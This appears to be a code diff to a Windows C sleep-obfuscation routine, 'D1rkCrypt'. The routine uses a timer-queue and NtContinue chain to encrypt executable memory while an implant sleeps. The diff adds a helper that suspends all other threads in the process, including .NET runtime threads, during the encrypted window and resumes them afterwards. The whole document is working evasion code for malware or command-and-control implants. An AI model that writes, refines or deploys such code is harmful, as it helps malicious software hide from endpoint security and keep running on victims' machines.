@@ -1,5 +1,6 @@
 #define _CRT_RAND_S
 #include <Windows.h>
+#include <tlhelp32.h>
 
 #define NT_SUCCESS(Status) ((NTSTATUS)(Status) >= 0)
 #define NtCurrentThread() (  ( HANDLE ) ( LONG_PTR ) -2 )
@@ -10,6 +11,33 @@ typedef struct {
 	DWORD	MaximumLength;
 	PVOID	Buffer;
 } USTRING;
+
+
+static VOID SuspendResumeOtherThreads(BOOL suspend) {
+    DWORD currentTid = GetCurrentThreadId();
+    DWORD pid = GetCurrentProcessId();
+    HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, 0);
+    if (hSnapshot == INVALID_HANDLE_VALUE) return;
+
+    THREADENTRY32 te32;
+    te32.dwSize = sizeof(THREADENTRY32);
+
+    if (Thread32First(hSnapshot, &te32)) {
+        do {
+            if (te32.th32OwnerProcessID == pid && te32.th32ThreadID != currentTid) {
+                HANDLE hThread = OpenThread(THREAD_SUSPEND_RESUME, FALSE, te32.th32ThreadID);
+                if (hThread) {
+                    if (suspend)
+                        SuspendThread(hThread);
+                    else
+                        ResumeThread(hThread);
+                    CloseHandle(hThread);
+                }
+            }
+        } while (Thread32Next(hSnapshot, &te32));
+    }
+    CloseHandle(hSnapshot);
+}
 
 
 VOID D1rkCrypt(DWORD SleepTime) {
@@ -135,6 +163,10 @@ VOID D1rkCrypt(DWORD SleepTime) {
         RopSetEvt.Rip = (DWORD64)SetEvent;
         RopSetEvt.Rcx = (DWORD64)hEvent;
 
+        // Suspend all other threads before encrypting executable sections.
+        // This prevents CLR threads (GC, finalizer, JIT, threadpool) from
+        // executing code in encrypted memory regions during the sleep window.
+        SuspendResumeOtherThreads(TRUE);
 
         CreateTimerQueueTimer(&hNewTimer, hTimerQueue, (WAITORTIMERCALLBACK)NtContinue, &RopProtRW, 100, 0, WT_EXECUTEINTIMERTHREAD);
         CreateTimerQueueTimer(&hNewTimer, hTimerQueue, (WAITORTIMERCALLBACK)NtContinue, &RopMemEnc, 200, 0, WT_EXECUTEINTIMERTHREAD);
@@ -144,6 +176,9 @@ VOID D1rkCrypt(DWORD SleepTime) {
         CreateTimerQueueTimer(&hNewTimer, hTimerQueue, (WAITORTIMERCALLBACK)NtContinue, &RopSetEvt, 600, 0, WT_EXECUTEINTIMERTHREAD);
 
         WaitForSingleObject(hEvent, INFINITE);
+
+        // Resume all other threads now that sections are decrypted and RX again
+        SuspendResumeOtherThreads(FALSE);
     }
     DeleteTimerQueue(hTimerQueue);
 }
